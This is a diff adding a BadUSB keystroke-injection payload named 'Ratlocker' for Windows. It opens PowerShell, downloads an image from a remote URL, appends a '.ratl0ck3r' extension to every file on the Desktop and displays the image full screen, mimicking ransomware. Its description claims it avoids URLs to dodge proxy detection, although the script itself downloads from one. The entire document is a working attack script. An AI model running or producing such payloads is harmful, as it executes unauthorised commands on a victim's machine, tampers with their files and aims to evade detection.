@@ -1,0 +1,39 @@
+REM Title:          Ratlocker
+REM Author:	    Ratcode404(.github.io)
+REM Target:         Windows
+REM Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backuped on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.
+
+REM Base delay after initiation and ps1 startup
+DELAY 1000
+GUI d
+DELAY 500
+GUI R
+DELAY 2000
+STRING powershell.exe
+ENTER
+DELAY 5000
+
+STRING  $Desktop = [Environment]::GetFolderPath("Desktop")
+ENTER
+DELAY 1000
+STRING Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $home\wallpaper.ratl0ck3r
+ENTER
+DELAY 1000
+
+REM Create new picture
+STRING Invoke-WebRequest -Uri "https://camo.githubusercontent.com/a807d586dfcd2ccf2a1f1f73c227fcd350563e2bec5acedb7b0e19f3da5938aa/68747470733a2f2f692e696d6775722e636f6d2f4b594d527239662e706e67" -OutFile "$home\ratl0ck3r.png"
+ENTER
+DELAY 3000
+
+REM Add ratl0ck3r extension
+DELAY 1000
+STRING dir $Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
+ENTER
+DELAY 3000
+
+REM Open picture
+STRING start "$home\ratl0ck3r.png"
+ENTER
+DELAY 10000
+ALT ENTER
+F11
